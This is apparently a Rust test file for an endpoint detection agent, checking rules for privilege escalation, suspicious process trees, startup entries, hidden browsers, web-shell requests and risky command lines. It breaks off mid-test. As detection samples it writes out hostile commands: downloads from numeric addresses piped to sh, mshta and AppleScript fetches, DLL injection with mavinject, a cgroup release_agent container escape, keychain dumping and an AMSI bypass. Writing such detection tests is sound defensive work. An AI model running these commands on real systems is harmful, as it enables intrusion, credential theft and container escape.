//! The rules added after the first releases: privilege escalation seen as it happens, system helpers that start
//! what they never start, a few more command lines and startup entries, and what a newer agent keeps back from an
//! older service.

use garrett::agent::known_to;
use garrett::linux::Snap;
use garrett::parse::{Conn, Proc};
use garrett::score::{bare_download, borrowed_name, containment_reason, downloaded_script, hidden_browser, mock_windows_folder, risky_commands, score_process, user_writable, Remote, View};
use garrett::watch::{Hands, Mode, Sensor, Watcher};
use serde_json::{json, Value};
use std::collections::HashMap;

const T: f64 = 1_800_000_000.0;
const ROOT: &str = "c:\\windows\\";

fn judged(view: &View) -> (String, Vec<String>) {
    let outcome = score_process(view, T, &HashMap::new(), &[], ROOT);
    (outcome.level, outcome.signals.iter().filter(|signal| signal.points > 0).map(|signal| signal.id.clone()).collect())
}

fn windows(name: &str, parent: &str, line: &str) -> View {
    View { name: name.into(), path: format!("C:\\Windows\\System32\\{name}"), parent_name: parent.into(), system: "windows".into(), cmdline: Some(line.into()),
        signature: Some(("signed".into(), "Microsoft Windows".into())), ..View::default() }
}

fn linux(name: &str, path: &str, parent: &str, line: &str) -> View {
    View { name: name.into(), path: path.into(), parent_name: parent.into(), system: "linux".into(), cmdline: Some(line.into()), ..View::default() }
}

#[test]
fn a_shell_under_a_windows_helper_that_starts_none_is_reported_and_its_ordinary_children_are_not() {
    for parent in ["winlogon.exe", "lsass.exe", "ctfmon.exe", "WerFault.exe"] {
        let (level, signals) = judged(&windows("cmd.exe", parent, "cmd.exe"));
        assert_eq!(level, "SUSPECT", "{parent}");
        assert!(signals.contains(&"helper_with_child".to_string()), "{parent}: {signals:?}");
    }
    // What these programs do start, and a shell started the ordinary way.
    for (name, parent) in [("userinit.exe", "winlogon.exe"), ("LogonUI.exe", "winlogon.exe"), ("dwm.exe", "winlogon.exe"), ("cmd.exe", "explorer.exe"), ("powershell.exe", "svchost.exe")] {
        let (level, signals) = judged(&windows(name, parent, name));
        assert!(!signals.contains(&"helper_with_child".to_string()), "{name} under {parent}");
        assert_eq!(level, "CLEAR", "{name} under {parent}");
    }
}

#[test]
fn what_the_kernel_or_a_share_helper_has_no_reason_to_start_is_reported() {
    let marked = |view: &View| judged(view).1.contains(&"helper_with_child".to_string());
    assert!(marked(&linux("sh", "/usr/bin/dash", "kthreadd", "/bin/sh -c /cmd")));
    assert!(marked(&linux("payload", "/var/lib/docker/overlay2/3f2a/diff/payload", "kthreadd", "/payload")));
    assert!(marked(&linux("x", "/dev/shm/x", "kthreadd", "/dev/shm/x")));
    assert!(marked(&linux("id", "/usr/bin/id", "cifs.upcall", "id")));
    assert_eq!(judged(&linux("sh", "/usr/bin/dash", "kthreadd", "/bin/sh -c /cmd")).0, "SUSPECT");
    // The helpers the kernel does start, and a shell with an ordinary parent.
    assert!(!marked(&linux("modprobe", "/usr/sbin/modprobe", "kthreadd", "/sbin/modprobe -q -- net-pf-10")));
    assert!(!marked(&linux("systemd-coredump", "/usr/lib/systemd/systemd-coredump", "kthreadd", "systemd-coredump 4242")));
    assert!(!marked(&linux("python3.12", "/usr/bin/python3.12", "kthreadd", "/usr/bin/python3 /usr/share/apport/apport")));
    assert!(!marked(&linux("sh", "/usr/bin/dash", "sshd", "-sh")));
}

#[test]
fn the_added_command_lines_are_recognised_and_their_everyday_forms_are_not() {
    let labels = |line: &str| -> Vec<&'static str> { risky_commands().iter().filter(|(pattern, _)| pattern.is_match(line)).map(|(_, label)| *label).collect() };
    for (line, label) in [
        ("xattr -d com.apple.quarantine /tmp/update", "the download warning removed from a new file"),
        ("xattr -cr /Users/sam/Downloads/Installer.app", "the download warning removed from a new file"),
        ("osascript -e do shell script \"curl -s http://203.0.113.9/a | sh\"", "a download run through AppleScript"),
        ("forfiles /p c:\\windows\\system32 /m notepad.exe /c \"mshta http://203.0.113.9/a.hta\"", "a command hidden behind a Windows system tool"),
        ("mavinject.exe 4172 /INJECTRUNNING c:\\users\\public\\a.dll", "code injected into a running program with a Windows system tool"),
        ("bcdedit /set {current} removememory 1024", "a boot setting that hides memory from Windows"),
        ("msiexec /i https://203.0.113.9/setup.msi /qn", "an installer fetched from the internet and run silently"),
        ("sh -c echo /cmd > /tmp/cg/release_agent", "a container escape through the cgroup release agent"),
    ] {
        assert!(labels(line).contains(&label), "{line}: {:?}", labels(line));
    }
    for line in ["xattr -l /Applications/Safari.app", "xattr -w com.example.note hello /Users/sam/Documents/a.txt", "osascript -e tell application \"Finder\" to activate",
        "forfiles /p c:\\logs /m *.log /d -30 /c \"cmd /c del @path\"", "bcdedit /enum", "msiexec /i c:\\installers\\setup.msi /qn", "msiexec /i https://example.com/setup.msi"] {
        assert!(labels(line).is_empty(), "{line}: {:?}", labels(line));
    }
}

#[test]
fn a_dotnet_loader_talking_to_the_internet_and_a_bot_channel_are_weighed() {
    let mut loader = windows("RegAsm.exe", "powershell.exe", "RegAsm.exe");
    loader.path = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe".into();
    assert!(!judged(&loader).1.contains(&"system_tool_misuse".to_string()), "nothing without a connection");
    loader.remotes = vec![Remote { address: "93.184.216.34".into(), port: 443, names: Vec::new() }];
    let (level, signals) = judged(&loader);
    assert!(signals.contains(&"system_tool_misuse".to_string()), "{signals:?}");
    assert_eq!(level, "WATCH", "one sign alone is watched, not reported");
    loader.remotes[0].port = 7702;
    assert_eq!(judged(&loader).0, "SUSPECT");

    let stealer = View { name: "viewer.exe".into(), path: "C:\\Users\\sam\\AppData\\Local\\Temp\\viewer.exe".into(), parent_name: "explorer.exe".into(), system: "windows".into(),
        signature: Some(("unsigned".into(), String::new())), file_age: Some(120.0),
        remotes: vec![Remote { address: "149.154.167.220".into(), port: 443, names: vec!["api.telegram.org".into()] }], ..View::default() };
    let (level, signals) = judged(&stealer);
    assert!(signals.contains(&"drop_or_tunnel_host".to_string()), "{signals:?}");
    assert_eq!(level, "SUSPECT");
    assert!(user_writable("C:\\Users\\sam\\Pictures\\photo.exe", "windows"));
    assert!(!user_writable("C:\\Program Files\\Player\\Music\\player.exe", "windows"));
}

#[test]
fn startup_entries_that_fetch_from_a_bare_address_or_borrow_apples_name_are_told_apart() {
    assert!(bare_download("*/5 * * * * root curl -s http://203.0.113.9/u.sh | sh"));
    assert!(bare_download("@reboot wget -q -O /usr/local/bin/k http://198.51.100.20:8080/k"));
    assert!(!bare_download("0 3 * * * root curl -fsS https://updates.example.com/check"));
    assert!(!bare_download("0 3 * * * root ping -c1 203.0.113.9"));
    let agent = "<key>Label</key><string>com.apple.updates</string><key>ProgramArguments</key><array><string>/Users/sam/Library/Application Support/u/helper</string></array>";
    assert!(borrowed_name("/Users/sam/Library/LaunchAgents/com.apple.updates.plist", agent));
    assert!(!borrowed_name("/Users/sam/Library/LaunchAgents/com.example.app.plist", &agent.replace("com.apple.updates", "com.example.app")));
    assert!(!borrowed_name("/Library/LaunchDaemons/com.apple.thing.plist", "<string>com.apple.thing</string><string>/usr/libexec/thing</string>"));
    assert!(!borrowed_name("/etc/cron.d/job", agent));
}

#[test]
fn a_newer_agent_keeps_back_what_an_older_service_does_not_know() {
    let signal = |id: &str, points: i64, category: &str| json!({"id": id, "points": points, "category": category, "evidence": "."});
    let only = json!({"key": "k", "score": 6, "categories": ["privilege"], "signals": [signal("privilege_jump", 6, "privilege")]});
    assert_eq!(known_to(only.clone(), 2), Some(only.clone()), "a service that knows the signal gets the case as it is");
    assert_eq!(known_to(only, 1), None, "nothing an older service can take is left");
    let mixed = json!({"key": "k", "score": 10, "categories": ["behaviour", "lineage"],
        "signals": [signal("helper_with_child", 5, "lineage"), signal("risky_command_line", 3, "lineage"), signal("discovery_command", 2, "behaviour")]});
    let kept = known_to(mixed, 1).expect("still a case");
    assert_eq!(kept["score"], 5);
    assert_eq!(kept["signals"].as_array().unwrap().len(), 2);
    let plain = json!({"key": "k", "score": 5, "signals": [signal("risky_command_line", 3, "lineage"), signal("fresh_file", 2, "identity")]});
    assert_eq!(known_to(plain.clone(), 1), Some(plain));
}

#[derive(Default)]
struct Machine {
    procs: Vec<Proc>,
}

impl Sensor for Machine {
    fn system(&self) -> &str {
        "linux"
    }
    fn processes(&mut self) -> Vec<Proc> {
        self.procs.clone()
    }
    fn connections(&mut self) -> Vec<Conn> {
        Vec::new()
    }
    fn command_lines(&mut self, _pids: &[u32]) -> HashMap<u32, String> {
        HashMap::new()
    }
    fn file_age(&mut self, _path: &str, _now: f64) -> Option<f64> {
        None
    }
}

#[derive(Default)]
struct Recorded {
    touched: Vec<u32>,
}

impl Hands for Recorded {
    fn suspend(&mut self, pid: u32) -> bool {
        self.touched.push(pid);
        true
    }
    fn resume(&mut self, pid: u32) -> bool {
        self.touched.push(pid);
        true
    }
    fn kill(&mut self, pid: u32) -> bool {
        self.touched.push(pid);
        true
    }
    fn block(&mut self, _addresses: &[String]) -> Option<bool> {
        Some(true)
    }
}

fn look(watcher: &mut Watcher<Machine, Recorded>, now: f64) -> Vec<Value> {
    let cases = watcher.tick_with(now, &[]);
    watcher.mark_reported(&cases, now);
    cases
}

#[test]
fn root_that_no_program_granted_is_reported_once_and_the_program_is_left_alone() {
    let user_shell = Proc { pid: 500, ppid: 1, name: "bash".into(), path: "/usr/bin/bash".into(), started: 5 };
    let mut watcher = Watcher::new(Machine { procs: vec![user_shell] }, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
    watcher.own.insert(1_000_000_000);
    assert!(look(&mut watcher, T).is_empty());
    let root_shell = Proc { pid: 600, ppid: 500, name: "sh".into(), path: "/usr/bin/dash".into(), started: 9 };
    watcher.sensor.procs.push(root_shell.clone());
    let ordinary = Snap { proc: root_shell.clone(), cmdline: "/bin/sh".into(), parent: "bash".into(), jumped: false, handed: false };
    watcher.on_exec(&ordinary, T + 1.0);
    assert!(look(&mut watcher, T + 1.0).is_empty(), "a shell under a shell is nothing");
    let jumped = Snap { jumped: true, ..ordinary };
    watcher.on_exec(&jumped, T + 2.0);
    let cases: Vec<Value> = look(&mut watcher, T + 2.0);
    assert_eq!(cases.len(), 1, "{cases:?}");
    assert_eq!(cases[0]["level"], "SUSPECT");
    assert_eq!(cases[0]["signals"][0]["id"], "privilege_jump");
    assert!(cases[0].get("actions").is_none(), "reported, not acted on");
    assert!(watcher.hands.as_ref().unwrap().touched.is_empty(), "the program was neither held nor ended");
    watcher.on_exec(&jumped, T + 30.0);
    assert!(look(&mut watcher, T + 30.0).is_empty(), "the same case is not said again within the hour");
}

#[cfg(target_os = "linux")]
#[test]
fn the_sensor_tells_root_that_was_granted_from_root_that_was_not() {
    use garrett::linux::LinuxSensor;
    use std::os::unix::fs::MetadataExt;
    use std::path::PathBuf;
    let base = std::env::temp_dir().join(format!("garrett-jump-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    let status = |users: &str| format!("Name:\tx\nUid:\t{users}\nGid:\t0\t0\t0\t0\n");
    let process = |pid: u32, users: &str| {
        std::fs::create_dir_all(base.join(pid.to_string())).unwrap();
        std::fs::write(base.join(pid.to_string()).join("status"), status(users)).unwrap();
    };
    process(500, "1000\t1000\t1000\t1000"); // an ordinary user's shell
    process(501, "1000\t0\t0\t0"); // a program that holds root
    process(600, "0\t0\t0\t0"); // root, started by 500
    process(601, "1000\t1000\t1000\t1000");
    std::os::unix::fs::symlink("/", base.join("600").join("root")).unwrap();
    std::os::unix::fs::symlink("/", base.join("601").join("root")).unwrap();
    let sensor = LinuxSensor::new(&base);
    let shell = PathBuf::from("/bin/sh");
    let child = |pid: u32, ppid: u32| Proc { pid, ppid, name: "sh".into(), path: "/bin/sh".into(), started: 1 };
    assert!(sensor.jumped(&child(600, 500), &[shell.clone()]), "root, an ordinary parent, and only a shell in its past");
    assert!(!sensor.jumped(&child(600, 500), &[]), "nothing known about its past");
    assert!(!sensor.jumped(&child(601, 500), &[shell.clone()]), "not root");
    assert!(!sensor.jumped(&child(600, 501), &[shell.clone()]), "its parent holds root");
    assert!(!sensor.jumped(&child(600, 1), &[shell.clone()]));
    assert!(!sensor.jumped(&child(600, 500), &[PathBuf::from("/no/such/program"), shell.clone()]), "a past that cannot be read");
    // Where this machine has a program that grants root, having been it is the ordinary way up.
    for granted in ["/usr/bin/su", "/bin/su", "/usr/bin/sudo"] {
        if std::fs::metadata(granted).is_ok_and(|meta| meta.uid() == 0 && meta.mode() & 0o4000 != 0) {
            assert!(!sensor.jumped(&child(600, 500), &[PathBuf::from(granted), shell.clone()]), "{granted}");
        }
    }
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn a_script_served_from_an_uploads_folder_and_two_more_request_shapes_are_marked() {
    use garrett::web::WebWatch;
    use std::io::Write;
    let base = std::env::temp_dir().join(format!("garrett-wider-web-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    std::fs::create_dir_all(base.join("www")).unwrap();
    let log = base.join("access.log");
    std::fs::write(&log, b"an earlier line\n").unwrap();
    let mut watch = WebWatch::new(vec![log.to_string_lossy().into_owned()], vec![base.join("www").to_string_lossy().into_owned()]);
    assert!(watch.poll(T).0.is_empty());
    let line = |client: &str, target: &str, status: u16| format!("{client} - - [16/Nov/2026:10:00:00 +0000] \"GET {target} HTTP/1.1\" {status} 512\n");
    let mut text = String::new();
    text += &line("198.51.100.7", "/wp-content/uploads/2026/11/a.php", 200);
    text += &line("198.51.100.8", "/wp-content/uploads/2026/11/photo.jpg", 200);
    text += &line("198.51.100.8", "/index.php", 200);
    text += &line("198.51.100.8", "/uploads/missing.php", 404);
    for index in 0..3 {
        text += &line("198.51.100.9", &format!("/api?data=O:8:%22Requests%22:{index}:{{}}"), 500);
        text += &line("198.51.100.10", &format!("/r{index}/{}", "+".repeat(60)), 400);
    }
    std::fs::OpenOptions::new().append(true).open(&log).unwrap().write_all(text.as_bytes()).unwrap();
    let (clients, _) = watch.poll(T + 1.0);
    let said = |client: &str| -> Vec<String> { clients.iter().filter(|(name, _)| name == client).flat_map(|(_, marks)| marks.iter().map(|(id, _, text)| format!("{id}: {text}"))).collect() };
    assert_eq!(said("198.51.100.7"), vec!["web_shell_request: was served a server-side script from an uploads folder 1 time(s)".to_string()]);
    assert!(said("198.51.100.8").is_empty(), "{:?}", said("198.51.100.8"));
    assert!(said("198.51.100.9").iter().any(|text| text.contains("object injection")), "{:?}", said("198.51.100.9"));
    assert!(said("198.51.100.10").iter().any(|text| text.contains("a memory corruption probe")), "{:?}", said("198.51.100.10"));
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_three_ways_to_the_top_that_nothing_grants_are_each_said_in_their_own_words() {
    let said = |view: &View| score_process(view, T, &HashMap::new(), &[], ROOT).signals.iter().find(|signal| signal.id == "privilege_jump").map(|signal| signal.evidence.clone()).unwrap_or_default();
    let shell = linux("sh", "/usr/bin/dash", "bash", "sh");
    assert!(said(&View { jumped: true, ..shell.clone() }).contains("never went through a program that grants root"));
    assert!(said(&View { handed: true, ..shell.clone() }).contains("tampered"));
    assert!(said(&View { jumped: true, ..windows("cmd.exe", "viewer.exe", "cmd.exe") }).contains("SYSTEM"));
    assert_eq!(said(&shell), "");
    assert_eq!(judged(&View { handed: true, ..shell }).0, "SUSPECT");
}

#[cfg(unix)]
#[test]
fn a_new_sign_in_key_is_news_and_the_keys_an_account_already_had_are_not() {
    use garrett::clean::StartupWatch;
    let base = std::env::temp_dir().join(format!("garrett-keys-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    let (root, state) = (base.join("root"), base.join("state"));
    let keys = |user: &str| root.join("home").join(user).join(".ssh/authorized_keys");
    for user in ["sam", "kim"] {
        std::fs::create_dir_all(keys(user).parent().unwrap()).unwrap();
    }
    std::fs::create_dir_all(&state).unwrap();
    std::fs::write(keys("sam"), "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOld sam@laptop\n").unwrap();
    let long_ago = std::time::SystemTime::now() - std::time::Duration::from_secs(3600);
    std::fs::File::options().write(true).open(keys("sam")).unwrap().set_modified(long_ago).unwrap();
    // An agent that was already watching this machine, and reads sign-in keys for the first time.
    std::fs::write(state.join("sentinel-startup.json"), "{}").unwrap();
    let mut watch = StartupWatch::new("linux", &state, Some(&root));
    assert!(watch.poll().is_empty(), "the keys that were already there are the starting point");
    std::fs::write(keys("sam"), "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOld sam@laptop\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINew someone@else\n").unwrap();
    std::fs::write(keys("kim"), "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB first@key\n").unwrap();
    let found = watch.poll();
    assert_eq!(found.len(), 2, "{found:?}");
    assert!(found.iter().all(|item| item.kind == "sign-in key" && item.lines.len() == 1));
    assert!(found.iter().any(|item| item.where_.ends_with("sam/.ssh/authorized_keys") && item.lines[0].ends_with(b"someone@else")));
    assert!(watch.poll().is_empty());
    let _ = std::fs::remove_dir_all(&base);
}

#[cfg(target_os = "linux")]
#[test]
fn a_program_that_never_becomes_a_root_shell_and_did_is_told_from_one_that_starts_shells() {
    use garrett::linux::LinuxSensor;
    use std::os::unix::fs::MetadataExt;
    use std::path::PathBuf;
    let base = std::env::temp_dir().join(format!("garrett-handed-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    for (pid, users) in [(500, "1000\t1000\t1000\t1000"), (600, "0\t0\t0\t0")] {
        std::fs::create_dir_all(base.join(pid.to_string())).unwrap();
        std::fs::write(base.join(pid.to_string()).join("status"), format!("Name:\tx\nUid:\t{users}\n")).unwrap();
    }
    std::os::unix::fs::symlink("/", base.join("600").join("root")).unwrap();
    let sensor = LinuxSensor::new(&base);
    let shell = Proc { pid: 600, ppid: 500, name: "sh".into(), path: "/bin/sh".into(), started: 1 };
    let chain = |before: &str| vec![PathBuf::from(before), PathBuf::from("/bin/sh")];
    let grants = |path: &str| std::fs::metadata(path).is_ok_and(|meta| meta.uid() == 0 && meta.mode() & 0o4000 != 0);
    let with_sign_in_library = std::fs::read("/usr/bin/su").is_ok_and(|body| body.windows(6).any(|part| part == b"libpam"));
    if grants("/usr/bin/su") && with_sign_in_library {
        assert!(sensor.handed(&shell, &chain("/usr/bin/su")), "su turned straight into a root shell");
        assert!(!sensor.handed(&Proc { name: "python3".into(), ..shell.clone() }, &chain("/usr/bin/su")), "only a shell is judged");
        assert!(!sensor.handed(&shell, &[PathBuf::from("/bin/sh")]), "nothing before the shell");
    }
    if grants("/usr/bin/passwd") {
        assert!(sensor.handed(&shell, &chain("/usr/bin/passwd")));
    }
    for launcher in ["/usr/bin/sudo", "/usr/bin/pkexec", "/usr/bin/doas"] {
        assert!(!sensor.handed(&shell, &chain(launcher)), "{launcher} starts shells as root in its own place");
    }
    assert!(!sensor.handed(&shell, &chain("/bin/cat")), "a program that grants nothing");
    let _ = std::fs::remove_dir_all(&base);
}

#[cfg(windows)]
#[test]
fn an_account_is_told_apart_as_the_machines_own_or_a_persons() {
    use garrett::win::{account, account_kind};
    assert_eq!(account_kind(&[1, 1, 0, 0, 0, 0, 0, 5, 18, 0, 0, 0]), "system");
    assert_eq!(account_kind(&[1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 233, 3, 0, 0]), "person");
    assert_eq!(account_kind(&[1, 5, 0, 0, 0, 0, 0, 12, 1, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]), "person");
    assert_eq!(account_kind(&[1, 1, 0, 0, 0, 0, 0, 5, 19, 0, 0, 0]), "", "the local service account");
    assert_eq!(account_kind(&[1, 1, 0, 0, 0, 0, 0, 5, 20, 0, 0, 0]), "", "the network service account");
    assert_eq!(account_kind(&[]), "");
    // This test itself runs as someone: a person on a desk, the machine's own account on a build server.
    let own = account(std::process::id()).expect("this process's own account can be read");
    assert!(own.len() >= 12 && own[0] == 1 && own.len() == 8 + 4 * own[1] as usize, "{own:?}");
}

#[test]
fn a_browser_nobody_can_see_a_helpdesk_tool_from_a_download_and_an_address_lookup_are_weighed() {
    let stealer = "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --headless=new --disable-gpu --no-sandbox --disable-logging --window-position=-10000,-10000 --window-size=1,1";
    assert!(hidden_browser(stealer));
    assert!(hidden_browser("msedge.exe --user-data-dir=C:\\ProgramData\\e --load-extension=C:\\ProgramData\\x --headless=new"));
    // One way of hiding is what test tools and scrapers do; the browser's own helpers repeat its switches.
    for line in ["chrome.exe --headless=new --remote-debugging-port=0 --user-data-dir=C:\\Temp\\t", "chrome.exe --window-position=-32000,-32000", "chrome.exe --window-size=1,1",
        "chrome.exe --load-extension=C:\\dev\\my-extension", "chrome.exe --type=renderer --headless=new --window-position=-10000,-10000", "chrome.exe https://example.com"] {
        assert!(!hidden_browser(line), "{line}");
    }
    let mut chrome = windows("chrome.exe", "runtime.exe", stealer);
    chrome.path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe".into();
    chrome.signature = Some(("signed".into(), "Google LLC".into()));
    let (level, signals) = judged(&chrome);
    assert_eq!((level.as_str(), signals.as_slice()), ("SUSPECT", &["hidden_browser".to_string()][..]));
    chrome.cmdline = Some("chrome.exe https://example.com".into());
    assert_eq!(judged(&chrome).0, "CLEAR");

    let portable = View { name: "AnyDesk.exe".into(), path: "C:\\Users\\sam\\Downloads\\AnyDesk.exe".into(), parent_name: "explorer.exe".into(), system: "windows".into(),
        signature: Some(("signed".into(), "AnyDesk Software GmbH".into())), file_age: Some(200.0), ..View::default() };
    let (level, signals) = judged(&portable);
    assert!(signals.contains(&"remote_control_tool".to_string()), "{signals:?}");
    assert_eq!(level, "SUSPECT", "a remote-control tool that arrived minutes ago and runs from a download folder");
    let installed = View { path: "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe".into(), file_age: None, ..portable.clone() };
    assert_eq!(judged(&installed), ("CLEAR".to_string(), Vec::new()), "installed by its owner");
    let old_download = View { file_age: Some(86400.0 * 30.0), ..portable };
    assert_ne!(judged(&old_download).0, "SUSPECT", "one that has been there for a month is not news");

    let mut bot = linux("kworkerd", "/var/tmp/kworkerd", "sh", "/var/tmp/kworkerd");
    bot.remotes = vec![Remote { address: "93.184.216.34".into(), port: 443, names: vec!["api.ipify.org".into()] }];
    assert!(judged(&bot).1.contains(&"address_lookup_host".to_string()));
    let mut updater = linux("ddclient", "/usr/bin/ddclient", "systemd", "ddclient");
    updater.remotes = bot.remotes.clone();
    assert!(!judged(&updater).1.contains(&"address_lookup_host".to_string()), "an installed program may ask");

    let labels = |line: &str| -> Vec<&'static str> { risky_commands().iter().filter(|(pattern, _)| pattern.is_match(line)).map(|(_, label)| *label).collect() };
    assert!(labels("security dump-keychain -d login.keychain").contains(&"the keychain copied out from a command line"));
    assert!(labels("security find-certificate -a").is_empty());
    assert!(labels("nvme fw-download /dev/nvme0 --fw=/tmp/f.bin").contains(&"firmware written to a storage drive"));
    assert!(labels("nvme list").is_empty());
    let keystone = "<key>Label</key><string>com.google.keystone.agent</string><array><string>/Users/sam/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate</string></array>";
    assert!(borrowed_name("/Users/sam/Library/LaunchAgents/com.google.keystone.agent.plist", keystone));
    assert!(!borrowed_name("/Users/sam/Library/LaunchAgents/com.google.keystone.agent.plist", &keystone.replace("Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate", "Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent")));
    let editor = View { name: "zsh".into(), path: "/bin/zsh".into(), parent_name: "Script Editor".into(), system: "macos".into(), cmdline: Some("zsh -c curl -s https://example.com/a | zsh".into()), ..View::default() };
    let (level, signals) = judged(&editor);
    assert!(signals.contains(&"script_from_document".to_string()) && level == "SUSPECT", "{signals:?}");
}

#[test]
fn a_command_window_seconds_after_a_keyboard_never_seen_before_is_reported_and_nothing_else_is() {
    let typed = |view: View| judged(&View { new_keyboard: true, ..view });
    let (level, signals) = typed(windows("powershell.exe", "explorer.exe", "powershell.exe"));
    assert_eq!((level.as_str(), signals.as_slice()), ("SUSPECT", &["keyboard_injection".to_string()][..]));
    assert!(typed(linux("bash", "/usr/bin/bash", "gnome-terminal-server", "bash")).1.contains(&"keyboard_injection".to_string()));
    // The same windows without a new keyboard, and what starts elsewhere while one is plugged in.
    assert_eq!(judged(&windows("powershell.exe", "explorer.exe", "powershell.exe")).0, "CLEAR");
    assert!(typed(windows("notepad.exe", "explorer.exe", "notepad.exe")).1.is_empty());
    assert!(typed(windows("cmd.exe", "svchost.exe", "cmd.exe /c backup.cmd")).1.is_empty());
    assert!(typed(linux("bash", "/usr/bin/bash", "cron", "bash -c /usr/local/bin/job")).1.is_empty());

    // Through the watcher: the keyboard arrives, a command window opens within seconds, and it is one case.
    let explorer = Proc { pid: 500, ppid: 1, name: "bash".into(), path: "/usr/bin/bash".into(), started: 5 };
    let mut watcher = Watcher::new(Machine { procs: vec![explorer] }, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
    watcher.own.insert(1_000_000_000);
    assert!(look(&mut watcher, T).is_empty());
    let shell = Snap { proc: Proc { pid: 600, ppid: 500, name: "bash".into(), path: "/usr/bin/bash".into(), started: 9 }, cmdline: "bash".into(), parent: "gnome-terminal-server".into(), jumped: false, handed: false };
    watcher.on_exec(&shell, T + 1.0);
    assert!(look(&mut watcher, T + 1.0).is_empty(), "a terminal opened on an ordinary day");
    watcher.keyboard_arrived(T + 100.0);
    watcher.on_exec(&shell, T + 103.0);
    let cases = look(&mut watcher, T + 103.0);
    assert_eq!(cases.len(), 1, "{cases:?}");
    assert_eq!(cases[0]["signals"][0]["id"], "keyboard_injection");
    assert!(watcher.hands.as_ref().unwrap().touched.is_empty(), "reported, not ended");
    let later = Snap { proc: Proc { pid: 700, ..shell.proc.clone() }, parent: "konsole".into(), ..shell.clone() };
    watcher.on_exec(&later, T + 200.0);
    assert!(look(&mut watcher, T + 200.0).is_empty(), "long after the keyboard arrived");
}

#[test]
fn a_script_run_straight_out_of_a_download_is_stopped_and_scripts_kept_elsewhere_are_not() {
    for line in [
        "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\sam\\AppData\\Local\\Temp\\Temp1_contract_template.zip\\contract template 4821.js\"",
        "wscript.exe C:\\Users\\sam\\Downloads\\agreement.js",
        "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\sam\\Downloads\\forms.zip\\lease.jse\"",
        "cscript.exe //nologo C:\\Users\\sam\\AppData\\Local\\Temp\\7zO4F2A1B\\invoice.vbs",
        "mshta.exe C:\\Users\\sam\\AppData\\Local\\Temp\\Rar$DIa1234.5678\\notice.hta",
    ] {
        assert!(downloaded_script(line), "{line}");
    }
    for line in ["wscript.exe C:\\Scripts\\logon.vbs", "cscript.exe //nologo C:\\Windows\\System32\\slmgr.vbs /dli", "wscript.exe \"C:\\Program Files\\Vendor\\helper.js\"", "wscript.exe"] {
        assert!(!downloaded_script(line), "{line}");
    }
    let opened = windows("wscript.exe", "explorer.exe", "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\sam\\AppData\\Local\\Temp\\Temp1_contract_template.zip\\contract template 4821.js\"");
    let outcome = score_process(&opened, T, &HashMap::new(), &[], ROOT);
    assert!(outcome.signals.iter().any(|signal| signal.id == "script_from_download"), "{:?}", outcome.signals);
    assert!(outcome.level == "SUSPECT" || outcome.level == "HOSTILE");
    assert!(!containment_reason(&outcome).is_empty(), "it is stopped, not only reported");
    // Started by anything else, the download alone is reason enough.
    let other = View { parent_name: "sihost.exe".into(), cmdline: Some("wscript.exe C:\\Users\\sam\\Downloads\\forms.zip\\lease.jse".into()), ..opened.clone() };
    assert_eq!(containment_reason(&score_process(&other, T, &HashMap::new(), &[], ROOT)), "a script was run straight out of a download through Windows Script Host");
    let logon = windows("wscript.exe", "userinit.exe", "wscript.exe C:\\Scripts\\logon.vbs");
    assert_eq!(judged(&logon).0, "CLEAR");
    // The same words on Linux are nothing: there is no Windows Script Host there.
    assert!(!judged(&linux("wscript.exe", "/home/sam/Downloads/wscript.exe", "bash", "wscript.exe /home/sam/Downloads/a.js")).1.contains(&"script_from_download".to_string()));
}

#[test]
fn the_rest_of_what_the_loader_does_on_a_windows_machine_is_recognised() {
    // The folder that only looks like the Windows folder.
    assert!(mock_windows_folder("C:\\Windows \\System32\\easinvoker.exe"));
    assert!(mock_windows_folder("\\\\?\\C:\\Windows \\System32\\netutils.dll"));
    assert!(!mock_windows_folder("C:\\Windows\\System32\\easinvoker.exe"));
    assert!(!mock_windows_folder("C:\\Windows Kits\\10\\bin\\signtool.exe"));
    let mut mock = windows("easinvoker.exe", "powershell.exe", "easinvoker.exe");
    mock.path = "C:\\Windows \\System32\\easinvoker.exe".into();
    let outcome = score_process(&mock, T, &HashMap::new(), &[], ROOT);
    assert!(outcome.signals.iter().any(|signal| signal.id == "system_tool_misuse" && signal.points == 5), "{:?}", outcome.signals);
    assert!(!outcome.signals.iter().any(|signal| signal.id == "installed_program"), "it is not in the Windows folder");
    assert!(!containment_reason(&outcome).is_empty());
    // Command lines.
    let labels = |line: &str| -> Vec<&'static str> { risky_commands().iter().filter(|(pattern, _)| pattern.is_match(line)).map(|(_, label)| *label).collect() };
    for (line, label) in [
        ("wscript.exe \"C:\\Users\\sam\\AppData\\Roaming\\Adobe\\LICENS~1.JS\"", "a script in a user folder run through Windows Script Host"),
        ("powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "the script scanner switched off from inside a script"),
